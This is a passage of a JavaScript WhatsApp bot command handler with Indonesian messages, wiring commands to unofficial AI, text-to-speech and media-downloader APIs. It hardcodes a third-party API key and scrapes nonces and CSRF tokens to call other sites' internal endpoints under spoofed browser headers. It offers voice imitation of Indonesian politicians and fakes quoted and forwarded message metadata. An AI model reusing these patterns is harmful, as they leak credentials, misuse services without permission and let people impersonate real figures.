    reply('âŒ Gagal menghubungi TurboChat')
  }
}
break
case "ai": {
  try {
    React()

    let text = args.join(" ")
    let quoted = m.quoted ? m.quoted : m
    let mime = (quoted.msg || quoted).mimetype || ""

    let imagePath = null

    // ===== AMBIL PROMPT =====
    let prompt =
      text ||
      quoted.text ||
      quoted.caption ||
      "Jelaskan isi foto ini dengan singkat dan jelas."

    // ===== JIKA ADA FOTO =====
    if (/image/.test(mime)) {
      let buffer = await quoted.download()
      imagePath = `./tmp/${Date.now()}.png`
      await fs.promises.writeFile(imagePath, buffer)
    }

    // ===== PANGGIL AI =====
    const result = await ai.chat(prompt, imagePath)

    await reply(result?.reply || "Tidak ada jawaban dari AI.")

    // ===== HAPUS FILE FOTO =====
    if (imagePath && fs.existsSync(imagePath)) {
      fs.unlinkSync(imagePath)
    }

  } catch (err) {
    console.error(err)
    reply("âŒ Terjadi kesalahan saat memproses AI.")
  }
}
break
case 'chateverywhere': {
  if (!text) return reply(
    `Contoh:\n${prefix + command} siapa presiden indo`
  )

  try {
    const payload = {
      model: {
        id: 'gpt-3.5-turbo',
        name: 'GPT-3.5',
        maxLength: 12000,
        tokenLimit: 4000,
        completionTokenLimit: 2500,
        deploymentName: 'gpt-35'
      },
      messages: [
        {
          role: 'user',
          content: text
        }
      ],
      temperature: 0.5,
      enableConversationPrompt: false
    }

    const res = await axios.post(
      'https://chateverywhere.app/api/chat',
      payload,
      {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent':
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/143 Mobile Safari/537.36'
        }
      }
    )

    let hasil = ''

    if (typeof res.data === 'string') {
      hasil = res.data.trim()
    } else {
      hasil =
        res.data?.choices?.[0]?.message?.content ||
        res.data?.message ||
        res.data?.content ||
        ''
    }

    if (!hasil) return reply('Respon AI kosong')

    await sock.sendMessage(
      m.chat,
      { text: hasil },
      { quoted: fakeQuoted }
    )
  } catch (e) {
    console.error(e)
    reply(e?.message || 'Terjadi kesalahan')
  }
}
break
			/**
  *Â» Nama :* â€” [ ASISTEN AI ] â€”
  *Â» Type :* Case - CJS
  *Â» Base Url :* https://chat.asistenai.com
  *Â» Saluran :* https://whatsapp.com/channel/0029Vb7XfVV2v1IzPVqjgq37
  *Â» Creator :* -ÆŠÎ±nÄoá´¡ã€…
**/


async function grok(question) {
  if (!question) throw new Error('Question is required.')

  const payload = {
    content: JSON.stringify({
      text: question,
      hasCode: false
    }),
    model: "x-ai/grok-4.1-fast"
  }

  const response = await axios.post(
    'https://chat.asistenai.com/api/chat/message',
    payload,
    {
      headers: {
        'Content-Type': 'application/json'
      }
    }
  )

  if (response.data && response.data.aiResponse) {
    return response.data.aiResponse
  }

  throw new Error('API response failed')
}

// ================== CASE ==================
case 'aiasisten':
case 'asisiten':
case 'asistenai': {
  if (!text) return reply('Masukkan pertanyaan.\n\nContoh:\n.asistenai apa itu javascript?')

  try {
    const res = await grok(text)
    reply(res)
  } catch (e) {
    reply('Error: ' + e.message)
  }
}
break
			// ===============================
// DEEP AI (CASE VERSION)
// ===============================

async function getNonce() {
  try {
    const res = await axios.get('https://chat-deep.ai/deepseek-chat/')
    const html = res.data
    const nonce = html.match(/nonce["']?\s*[:=]\s*["']([^"']+)["']/i)
    return nonce ? nonce[1] : null
  } catch {
    return null
  }
}

async function deepseekChat(message) {
  if (!message) throw new Error('Message is required')

  const nonce = await getNonce()
  if (!nonce) throw new Error('Gagal mengambil nonce')

  const form = new FormData()
  form.append('action', 'deepseek_chat')
  form.append('message', message)
  form.append('model', 'deepseek-chat')
  form.append('nonce', nonce)
  form.append('save_conversation', '0')
  form.append('session_only', '1')

  const res = await axios.post(
    'https://chat-deep.ai/wp-admin/admin-ajax.php',
    form,
    {
      headers: {
        ...form.getHeaders(),
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
        'Origin': 'https://chat-deep.ai',
        'Referer': 'https://chat-deep.ai/deepseek-chat/'
      }
    }
  )

  if (res.data?.success) {
    return res.data.data.response
      .replace(/<think>[\s\S]*?<\/think>/g, '')
      .trim()
  }

  throw new Error(res.data?.data?.message || 'Response gagal')
}

// ===============================
// CASE
// ===============================
case 'deepseekai':
case 'aideepseek':
case 'deepai':
case 'deepseek': {
  if (!text) return reply('Contoh:\n.deepai siapa presiden indonesia?')

  try {
    reply('â³ Memproses...')
    const hasil = await deepseekChat(text)
    reply(hasil)
  } catch (err) {
    reply('âŒ Error:\n' + err.message)
  }
}
break
			case 'castorice':
			case 'castoriceai':
			case 'aicastorice': {
			if (!text) return reply("contoh : "+cmd+" Hai")
			const api = await fetchJson(`https://Vynaa-apis.vercel.app/api/castorice?q=${text}`)
			const res = api.answer
			reply(res)
			}
			break
		
						
			case "theresaai":
			case "aitheresa":
			case "theresa": {
			if (!text) return reply("contoh "+cmd+" Hai")
			const api = await fetchJson(`https://theresapisv3.vercel.app/ai/theresa?ask=${text}`)
			const res = api.result
			reply(res)
			}
			break
			
			
			// --- tambahkan di file utama bot kamu --- //
			case 'veo3': 
			case "sora2": {
  if (!text) return reply("Contoh:\n.sora2 kucing lucu lompat di jendela")

  const axios = require("axios")
  const sleep = ms => new Promise(r => setTimeout(r, ms))

  reply("ğŸ¬ Membuat video... mohon tunggu")

  // 1. CREATE TASK
  let create = await axios.get(
    "https://fgsi.dpdns.org/api/ai/sora2",
    {
      params: {
        apikey: "fgsiapi-3a0c8760-6d",
        prompt: text,
        ratio: "",
        enhancePrompt: "true"
      }
    }
  )

  if (!create.data.status) {
    return reply("Gagal membuat task")
  }

  let pollUrl = create.data.data.pollUrl
  let status = "Pending"
  let result

  // 2. POLLING STATUS
  while (status === "Pending") {
    await sleep(5000) // jeda 5 detik
    let poll = await axios.get(pollUrl)

    status = poll.data.data.status

    if (status === "Success") {
      result = poll.data.data.result
      break
    }
  }

  if (!result || !result.url) {
    return reply("Gagal mendapatkan hasil video")
  }

  // 3. KIRIM VIDEO DARI URL
  await sock.sendMessage(m.chat, {
    video: { url: result.url },
    mimetype: "video/mp4",
    caption: `ğŸ¥ *SORA2 RESULT*\n\nPrompt:\n${result.prompt_original}`
  }, { quoted: fakeQuoted })

}
break
			case 'texttomusic':
			case 'txttomusic':
			case "txt2music": {
  try {
    if (!text) return reply(
      `Contoh:\n${cmd} zion|happy|folk|bestfriend`
    )

    const [name, mood, genre, lyrics] = text.split("|")
    if (!name || !mood || !genre || !lyrics)
      return reply("Format salah!\nnama|mood|genre|lyrics")

    reply("ğŸµ Membuat musik... mohon tunggu")

    // 1. CREATE TASK
    const create = await axios.get(
      "https://fgsi.dpdns.org/api/ai/music/sonu",
      {
        params: {
          apikey: "fgsiapi-3a0c8760-6d",
          name,
          mood,
          genre,
          lyrics
        }
      }
    )

    if (!create.data.status)
      throw "Gagal membuat task musik"

    const taskId = create.data.data.taskId
    const pollUrl = create.data.data.pollUrl

    // 2. POLLING STATUS
    let result
    for (let i = 0; i < 15; i++) {
      await new Promise(res => setTimeout(res, 3000))

      const poll = await axios.get(pollUrl)
      if (poll.data.data.status === "Success") {
        result = poll.data.data.result
        break
      }
    }

    if (!result) throw "Waktu pembuatan musik habis"

    // 3. SEND AUDIO
    await sock.sendMessage(
      m.chat,
      {
        audio: { url: result.url },
        mimetype: "audio/mpeg",
        caption:
`ğŸ¶ *TXT TO MUSIC*
â€¢ Judul : ${result.name}
â€¢ Mood   : ${result.mood}
â€¢ Genre  : ${result.genre}

ğŸ“œ *Lyrics:*
${result.lyrics.slice(0, 500)}...`
      },
      { quoted: fakeQuoted }
    )

  } catch (err) {
    console.error(err)
    reply("âŒ Gagal membuat musik, coba lagi nanti")
  }
}
break
			case 'copilot2':
			case 'copilot-think': {
			if (!text) return reply(`${cmd} hai`)
			const api = await fetchJson(`https://api.yupra.my.id/api/ai/copilot-think?text=${text}`)
			const result = api.result;
			reply(result)
			}
			break
			
case "texttospeech":
case "text2speech":
case "elevenlabs": {
    if (!text) return reply("Masukkan teks!\n\nContoh:\n.elevenlabs hai guys")

    global.elevenlabsText = global.elevenlabsText || {}
    global.elevenlabsText[m.sender] = text

    const buttons = [
        { buttonId: ".el_bella", buttonText: { displayText: "ğŸ™ï¸ Bella" }, type: 1 },
        { buttonId: ".el_adam", buttonText: { displayText: "ğŸ—£ï¸ Adam" }, type: 1 },
        { buttonId: ".el_miku", buttonText: { displayText: "ğŸ§ Miku" }, type: 1 },
        { buttonId: ".el_jokowi", buttonText: { displayText: "ğŸ‡®ğŸ‡© Jokowi" }, type: 1 },
        { buttonId: ".el_prabowo", buttonText: { displayText: "ğŸ¦… Prabowo" }, type: 1 }
    ]

    await sock.sendMessage(m.chat, {
        text: "Pilih model suara ElevenLabs:",
        buttons,
        footer: "ElevenLabs TTS",
        headerType: 1
    }, { quoted: fakeQuoted })
}
break
case "el_bella":
case "el_adam":
case "el_miku":
case "el_jokowi":
case "el_prabowo": {

    const message = global.elevenlabsText?.[m.sender]
    if (!message) return reply("Teks tidak ditemukan, ulangi perintah.")

    let voice
    switch (command) {
        case "el_bella": voice = "bella"; break
        case "el_adam": voice = "adam"; break
        case "el_miku": voice = "miku"; break
        case "el_jokowi": voice = "jokowi"; break
        case "el_prabowo": voice = "prabowo"; break
        default: voice = "bella"
    }

    try {
        reply("ğŸ™ï¸ Sedang mengubah teks menjadi suara...")

        const audioUrl =
            `${global.api.base}/api/elevenlabs` +
            `?text=${encodeURIComponent(message)}` +
            `&voice=${voice}` +
            `&pitch=0&speed=0.9` +
            `&key=${global.api.key}`

        await sock.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: "audio/mpeg",
            ptt: true
        }, { quoted: fakeQuoted })

        delete global.elevenlabsText[m.sender]

    } catch (e) {
        console.error(e)
        reply("âŒ Gagal generate TTS.")
    }
}
break
case "lirik":
case "lyrics": {
if (!text) return reply("contoh:"+cmd+" in the stars")
const api = await fetchJson("https://api-faa.my.id/faa/lyrics?q="+text)
const foto = api.result.cover.large
const tittle = api.result.title
const artis = api.result.artist
const album = api.result.album
const lyrics = api.result.lyrics
const teks = `
- tittle : ${tittle}
- artist : ${artis}
- album : ${album}

${lyrics}
`
await sock.sendMessage(m.chat, {
image: { url: foto },
caption: teks
}, { quoted: fakeQuoted });
}
break
			case "perplexity":
			{
			if (!text) return reply("contoh :"+cmd+" hai")
			const api = await fetchJson("https://zelapioffciall.koyeb.app/ai/perplexity?text="+text)
			const udah = api.message
			reply(udah)
			}
			break
			case "toprompt": {
			
  if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${cmd}`)
reply("Tunggu sebentar...")
let media = await sock.downloadAndSaveMediaMessage(quoted);
let response = await CatBox(media);
const api = await fetchJson(`https://api.deline.web.id/ai/toprompt?url=${response}`)
const result = api.result.translated
reply(result)
}
break
			case "aiislam":
			case "islamai": {
			
			if (!text) return reply(cmd+" Hai")
			const apiUrl = await fetchJson(`https://api.siputzx.my.id/api/ai/muslimai?query=${text}`)
			const result = apiUrl.data
			reply(result)
			}
			break
			case "felo":
			case "feloai": {
			
			if (!text) return reply(cmd+" Hai")
			const apiUrl = await fetchJson(`https://api.zenzxz.my.id/api/ai/feloai?query=${text}`)
			const result = apiUrl.data.answer
			reply(result)
			}
			break
			case "copilot":
			case "copilotai": {
			
			if (!text) return reply(cmd+" Hai")
			const apiUrl = await fetchJson(`https://api.zenzxz.my.id/api/ai/copilotai?message=${text}&model=default`)
			const result = apiUrl.data.text
			reply(result)
			}
			break
case 'ocr':
case 'readtext': {

try {
 const q = m.quoted ? m.quoted : m
 const mime =
 (q.msg || q).mimetype ||
 q.mimetype ||
 q.message?.imageMessage?.mimetype

 if (!mime || !/image/.test(mime))
 return reply("âš ï¸ Kirim atau reply gambar dengan caption *ocr* untuk ekstrak teks.")

 await sock.sendMessage(m.chat, { react: { text: "â³", key: m.key } })

 const buffer = await q.download()
 const mimeType = /png/.test(mime) ? "image/png" : "image/jpeg"
 const imageBase64 = buffer.toString("base64")

 const url = "https://staging-ai-image-ocr-266i.frontend.encr.app/api/ocr/process"
 const res = await fetch(url, {
 method: "POST",
 headers: { "content-type": "application/json" },
 body: JSON.stringify({ imageBase64, mimeType }),
 })

 if (!res.ok) throw new Error(await res.text())
 const json = await res.json()

 const text = json.extractedText || "Teks tidak ditemukan."
 reply(`ğŸ“„ *Hasil OCR:*\n\n${text}`)

 await sock.sendMessage(m.chat, { react: { text: "âœ…", key: m.key } })

 } catch (err) {
 console.error(err)
 reply("âŒ Gagal melakukan OCR, coba lagi nanti.")
 await sock.sendMessage(m.chat, { react: { text: "âŒ", key: m.key } })
 }
}
break			
case 'Vynaa':
case 'autoai':
    handleFeatureToggle('autoaigc', command);
    break;
case 'Vynaaai':
case 'gpt':
case 'openai':
case 'ai': {

if (!text) return reply(`Contoh : ${cmd} Siapa presiden Indonesia`)
      try {
        const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
      loadai(`${data.result}`);
    } else {
      Vynaa(pushname, text);
  }
} catch (e) {
  reply('Terjadi error, coba lagi nanti.');
}

}
break
// DOWNLOAD 
case 'git':
            case 'gitclone': {
              try {
                if (!args[0]) return reply(`Contoh: ${cmd} linknya`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Harus berupa link github!`)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                var [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                var url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {
                  method: 'HEAD'
                })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                sock.sendMessage(m.chat, {
                  document: {
                    url: url
                  },
                  fileName: filename + '.zip',
                  mimetype: 'application/zip'
                }, {
                  quoted: fakeQuoted
                })
              } catch (err) {
                reply('Terjadi kesalahan')
              }
            }
            break
case "fb":
case "fbdl":
case "fbdownload": {
    if (!text.startsWith("https://")) return reply("Masukkan URL Facebook!");

    try {
        await sock.sendMessage(m.chat, { react: { text: "ğŸ•–", key: m.key } });

        const res = await fetch(`https://api-faa.my.id/faa/fbdownload?url=${encodeURIComponent(text)}`)
        const json = await res.json();

        if (!json.status) return reply("Gagal mengambil data!");

        const info = json.result.info;
        const media = json.result.media;

        // ==================================================
        //            IMAGE MODE (SLIDE)
        // ==================================================
        if (!media.video_hd && !media.video_sd) {
            let imgArray = [];

            // image yg tersedia
            let images = [];
            if (media.photo_image) images.push(media.photo_image);
            else images.push(media.thumbnail);

            let idx = 0;

            for (let img of images) {
                let prep = await prepareWAMessageMedia({
                    image: { url: img }
                }, { upload: sock.waUploadToServer });

                imgArray.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: `Foto Slide Ke *${idx += 1}*`,
                        hasMediaAttachment: true,
                        ...prep
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: `{"display_text":"Buka Foto","url":"${img}","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                });
            }

            const slideMsg = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.fromObject({
                                text: "*FACEBOOK - IMAGE DOWNLOAD*"
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: imgArray
                            })
                        })
                    }
                }
            }, {
                userJid: m.sender,
                quoted: fakeQuoted
            });

            await sock.relayMessage(m.chat, slideMsg.message, {
                messageId: slideMsg.key.id
            });

            await sock.sendMessage(m.chat, { react: { text: "âœ…", key: m.key } });
            return;
        }

        // ==================================================
        //                  VIDEO MODE
        // ==================================================
        const vid = media.video_hd || media.video_sd;
        if (!vid) return reply("Video tidak ditemukan!");

        await sock.sendMessage(m.chat, {
            video: { url: vid },
            caption: `*FACEBOOK - VIDEO DOWNLOADER*\n\n${info.title || ""}`,
            viewOnce: true
        }, { quoted: fakeQuoted });

        await sock.sendMessage(m.chat, { react: { text: "âœ…", key: m.key } });

    } catch (e) {
        console.log(e)
        reply("Terjadi kesalahan!");
    }
}
break;
case "ig": 
case "igdl":
case "Instagram": {
async function igee_deel(url) {
  try {
    const endpoint = 'https://igram.website/content.php?url=' + encodeURIComponent(url)

    const { data } = await axios.post(endpoint, '', {
      headers: {
        authority: 'igram.website',
        accept: '*/*',
        'accept-language': 'id-ID,id;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        cookie: '',
        referer: 'https://igram.website/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
      }
    })

    return data
  } catch (e) {
    return { error: e.message }
  }
}

function parse(html) {
  const clean = html.replace(/\n|\t/g, '')

  const videoMatch = [...clean.matchAll(/<source src="([^"]+)/g)].map(x => x[1])
  let imageMatch = [...clean.matchAll(/<img src="([^"]+)/g)].map(x => x[1])

  if (imageMatch.length > 0) imageMatch = imageMatch.slice(1)

  const captionRaw = clean.match(/<p class="text-sm"[^>]*>(.*?)<\/p>/)
  const caption = captionRaw ? captionRaw[1].replace(/<br ?\/?>/g, '\n') : ''

  const likes = clean.match(/far fa-heart"[^>]*><\/i>\s*([^<]+)/)
  const comments = clean.match(/far fa-comment"[^>]*><\/i>\s*([^<]+)/)
  const time = clean.match(/far fa-clock"[^>]*><\/i>\s*([^<]+)/)

  return {
    is_video: videoMatch.length > 0,
    videos: videoMatch,
    images: imageMatch,
    caption,
    likes: likes ? likes[1] : null,
    comments: comments ? comments[1] : null,
    time: time ? time[1] : null
  }
}

function detectContentType(url) {
  if (url.includes('/reel/')) return 'Reel'
  if (url.includes('/stories/')) return 'Story'
  if (url.includes('/p/')) return 'Post'
  return 'Unknown'
}

async function instagram(url) {
  try {
    if (!url || typeof url !== 'string') {
      throw new Error('URL tidak valid')
    }

    const contentType = detectContentType(url)
    const raw = await igee_deel(url)
    
    if (!raw || raw.error) {
      throw new Error(raw.error || 'Gagal mengambil data dari Instagram')
    }

    if (!raw.html) {
      throw new Error('Response tidak memiliki HTML')
    }

    const parsed = parse(raw.html)

    const result = {
      success: true,
      status: raw.status || 'success',
      username: raw.username || null,
      contentType: contentType,
      type: parsed.is_video ? 'video' : 'image',
      caption: parsed.caption || '',
      likes: parsed.likes || null,
      comments: parsed.comments || null,
      time: parsed.time || null,
      media: []
    }

    if (parsed.is_video && parsed.videos.length > 0) {
      result.media = parsed.videos.map((url, idx) => ({
        type: 'video',
        url: url,
        index: idx + 1
      }))
    } else if (parsed.images.length > 0) {
      result.media = parsed.images.map((url, idx) => ({
        type: 'image',
        url: url,
        index: idx + 1
      }))
    }

    if (result.media.length === 0) {
      throw new Error('Tidak ada media yang ditemukan')
    }

    return result

  } catch (error) {
    throw error
  }
}
  try {
    if (!args[0]) {
      return reply(`âŒ *Masukkan URL Instagram!*\n\n*Contoh:*\n${cmd} https://www.instagram.com/p/xxx\n\n*Support:*\nâ€¢ Post (Image/Video)\nâ€¢ Reels\nâ€¢ Stories\nâ€¢ Multiple Images`)
    }

    const url = args[0]

    if (!url.match(/instagram\.com|instagr\.am/i)) {
      return reply('âŒ URL bukan dari Instagram!')
    }

    await reply('â³ *Sedang mengunduh media dari Instagram...*\n_Mohon tunggu sebentar_')

    const result = await instagram(url)

    let captionText = `âœ… *Instagram Downloader*\n\n`
    if (result.username) captionText += `ğŸ‘¤ *Username:* @${result.username}\n`
    if (result.contentType) captionText += `ğŸ“Œ *Type:* ${result.contentType}\n`
    if (result.likes) captionText += `â¤ï¸ *Likes:* ${result.likes}\n`
    if (result.comments) captionText += `ğŸ’¬ *Comments:* ${result.comments}\n`
    if (result.time) captionText += `â° *Posted:* ${result.time}\n`
    captionText += `ğŸ¬ *Total Media:* ${result.media.length}\n`
    if (result.caption) {
      const shortCaption = result.caption.length > 200 
        ? result.caption.substring(0, 200) + '...' 
        : result.caption
      captionText += `\nğŸ“ *Caption:*\n${shortCaption}`
    }
    
    for (const [index, media] of result.media.entries()) {
      try {
        const mediaCaption = result.media.length > 1 
          ? `${captionText}\n\nğŸ“Š *Media ${media.index}/${result.media.length}*`
          : captionText

        if (media.type === 'video') {
          await sock.sendMessage(m.chat, {
            video: { url: media.url },
            caption: mediaCaption,
            mimetype: 'video/mp4'
          }, { quoted: fakeQuoted })
        } else {
          await sock.sendMessage(m.chat, {
            image: { url: media.url },
            caption: mediaCaption
          }, { quoted: fakeQuoted })
        }
        
        if (result.media.length > 1 && index < result.media.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 1500))
        }
      } catch (err) {
        console.error(`Error sending media ${media.index}:`, err)
        await reply(`âŒ Gagal mengirim media ${media.index}`)
      }
    }

  } catch (error) {
    console.error('Error in Instagram handler:', error)
    await reply(`âŒ *Terjadi kesalahan!*\n\n${error.message || 'Gagal mengunduh media'}`)
  }
  }
  break

case 'gddl':
    case 'gdrive': {

try {
        if (!text) return reply(`Contoh: ${cmd} linknya`)
        
        let hao = await fetchJson(`https://api.siputzx.my.id/api/d/gdrive?url=${text}`)
        let fileName = hao.data.name
        return await sock.sendMessage(m.chat, {
          document: {
            url: hao.data.download
          },
          mimetype: 'application/zip',
          fileName: fileName
        }, {
          quoted: fakeQuoted
        })
      } catch (err) {
        console.error('Kesalahan pada API:', err)
        reply('Terjadi kesalahan')
      }
    }
    break
case 'mediafire': 
case 'mediafiredl': 
case 'mfdl': {
    if (!text) return reply(`âŒ Masukkan link Mediafire!\n\nğŸ“Œ Contoh:\n${prefix + command} https://www.mediafire.com/file/xxxxxx`)
    if (!isUrl(text) || !text.includes('mediafire.com')) return reply('âŒ Link tidak valid! Pastikan itu link Mediafire.')

    reply('â³ Sedang memproses link Mediafire...')

    try {
        const data = await mediafire(text)
        if (!data || !data.downloadUrl) return reply('âŒ Gagal mengambil data dari Mediafire.')

        let caption = `ğŸ“¦ *MEDIAFIRE DOWNLOADER*\n\n`
        caption += `ğŸ—‚ï¸ Nama File: ${data.fileName}\n`
        caption += `ğŸ“ Ukuran: ${data.fileSize}\n`
        caption += `ğŸ“… Upload: ${data.uploadDate}\n`
        caption += `ğŸ“„ Mime: ${data.mimeType || 'Tidak diketahui'}\n`
        caption += `\nğŸ”— *Link Download:* ${data.downloadUrl}`

        // Kirim info file terlebih dahulu
        await sock.sendMessage(m.chat, { text: caption }, { quoted: fakeQuoted })

        // Coba kirim file langsung (jika ukuran memungkinkan)
        if (data.downloadUrl && data.fileSize && !data.fileSize.includes('GB')) {
            await sock.sendMessage(
                m.chat,
                {
                    document: { url: data.downloadUrl },
                    mimetype: data.mimeType || 'application/octet-stream',
                    fileName: data.fileName
                },
                { quoted: fakeQuoted }
            )
        } else {
            reply('âš ï¸ File terlalu besar untuk dikirim langsung.\nSilakan unduh manual melalui link di atas.')
        }

    } catch (e) {
        console.error(e)
        reply('âŒ Terjadi kesalahan saat memproses link Mediafire.')
    }
}
break
case 'douyin':
case 'capcut':
case 'threads':
case 'kuaishou':
case 'qq':
case 'espn':
case 'pinterest':
case 'imdb':
case 'imgur':
case 'ifunny':
case 'izlesene':
case 'reddit':
case 'youtube':
case 'twitter':
case 'vimeo':
case 'snapchat':
case 'bilibili':
case 'dailymotion':
case 'sharechat':
case 'likee':
case 'linkedin':
case 'tumblr':
case 'hipi':
case 'telegram':
case 'getstickerpack':
case 'bitchute':
case 'febspot':
case '9gag':
case 'oke.ru':
case 'rumble':
case 'streamable':
case 'ted':
case 'sohutv':
case 'pornbox':
case 'xvideos':
case 'xnxx':
case 'kuaishou':
case 'xiaohongshu':
case 'ixigua':
case 'weibo':
case 'miaopai':
case 'meipai':
case 'xiaoying':
case 'national video':
case 'yingke':
case 'sina':
case 'bluesky':
case 'soundcloud':
case 'mixcloud':
case 'spotify':
case 'zingmp3':
case 'bandcamp':
case 'download':
case "aio": {
      if (!q) return reply('link Sosmed?')
   try {
    async function fetchInitialPage(initialUrl) {
      try {
        const axios = require('axios')
        const cheerio = require('cheerio')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': initialUrl,
        }
        const response = await axios.get(initialUrl, { headers })
        const $ = cheerio.load(response.data)
        const csrfToken = $('meta[name="csrf-token"]').attr('content')
        if (!csrfToken) throw new Error('Gagal nemu token keamanan, coba lagi!')
        let cookies = ''
        if (response.headers['set-cookie']) {
          cookies = response.headers['set-cookie'].join('; ')
        }
        return { csrfToken, cookies }
      } catch (error) {
        throw new Error(`Gagal ambil halaman awal: ${error.message}`)
      }
    }
    async function postDownloadRequest(downloadUrl, userUrl, csrfToken, cookies) {
      try {
        const axios = require('axios')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': 'https://on4t.com/online-video-downloader',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Accept': '*/*',
          'X-Requested-With': 'XMLHttpRequest',
          'Cookie': cookies
        }
        const postData = new URLSearchParams()
        postData.append('_token', csrfToken)
        postData.append('link[]', userUrl)
        const response = await axios.post(downloadUrl, postData.toString(), { headers })
        if (response.data?.result?.length) {
          return response.data.result.map(item => ({
            title: item.title,
            thumb: item.image,
            url: item.video_file_url || item.videoimg_file_url
          }))
        } else {
          throw new Error('Respons dari server gak sesuai harapan, coba link lain!')
        }
      } catch (error) {
        throw new Error(`Gagal proses permintaan download: ${error.message}`)
      }
    }
    async function sendMediaAutoType(url, title) {
      try {
        const axios = require('axios')
        const { fromBuffer } = require('file-type')   
        const res = await axios.get(url, { responseType: 'arraybuffer' })
        const buff = Buffer.from(res.data)
        const fileInfo = await fromBuffer(buff)
        if (!fileInfo) return reply(`Gagal deteksi tipe file: ${title}`)
        let mime = fileInfo.mime
        let ext = fileInfo.ext
        if (mime.startsWith('video/')) {
          await sock.sendMessage(m.chat, { video: buff, caption: title }, { quoted: fakeQuoted })
        } else if (mime.startsWith('audio/')) {
          await sock.sendMessage(m.chat, { audio: buff, mimetype: mime }, { quoted: fakeQuoted })
        } else if (mime.startsWith('image/')) {
          await sock.sendMessage(m.chat, { image: buff, caption: title }, { quoted: fakeQuoted })
        } else {
          await sock.sendMessage(m.chat, {
            document: buff,
            fileName: `${title}.${ext}`,
            mimetype: mime
          }, { quoted: fakeQuoted })
        }
      } catch (err) {
        reply(`Gagal kirim media: ${err.message}`)
      }
    }
    const initialUrl = 'https://on4t.com/online-video-downloader'
    const downloadUrl = 'https://on4t.com/all-video-download'
    const { csrfToken, cookies } = await fetchInitialPage(initialUrl)
    const results = await postDownloadRequest(downloadUrl, q, csrfToken, cookies)
    for (let i = 0; i < results.length; i++) {
      await sendMediaAutoType(results[i].url, results[i].title)
    }
    await sock.sendMessage(m.chat, { react: { text: 'ğŸ’•', key: m.key } })
  } catch (err) {
    await sock.sendMessage(m.chat, { react: { text: 'ğŸ˜³', key: m.key } }) 
    reply(err.message)
  }
break;
}
case "snackvideo":
      case "sv":
        {
        
          if (!text) {
            return reply(`mana link-nya? contoh: ${cmd} https://url/reel/xxx/?igsh=xxx`);
            React()
          }
          let memek = await snck(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await sock.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "berhasil mendownload gambar dari URL.",
                    contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `Â© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: name,
body: `version â€¢ ${version}`,
thumbnailUrl: thumbnail2,
sourceUrl: `https://Uptime â€¢ ${runtime(process.uptime())}`,
mediaType: 1,
renderLargerThumbnail: false,
}}
                  }, {
                    quoted: fakeQuoted
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await sock.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " "
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  await sock.sendMessage(m.chat, {
                    text: `tipe media tidak didukung: ${mimeType}`
                  }, {
                    quoted: fakeQuoted
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await sock.sendMessage(m.chat, {
              text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, {
              quoted: fakeQuoted
            });
          }
        }
        break;
case "tiktok":
      case "tt":
        {
        
          let momok = "`ğ—§ ğ—œ ğ— ğ—§ ğ—¢ ğ— - ğ—— ğ—¢ ğ—ª ğ—¡ ğ—Ÿ ğ—¢ ğ—” ğ——`";
          if (!text.startsWith("https://")) {
            return reply("url");
          }
          await tiktokDl(q).then(async result => {
            await sock.sendMessage(m.chat, {
              react: {
                text: "ğŸ•–",
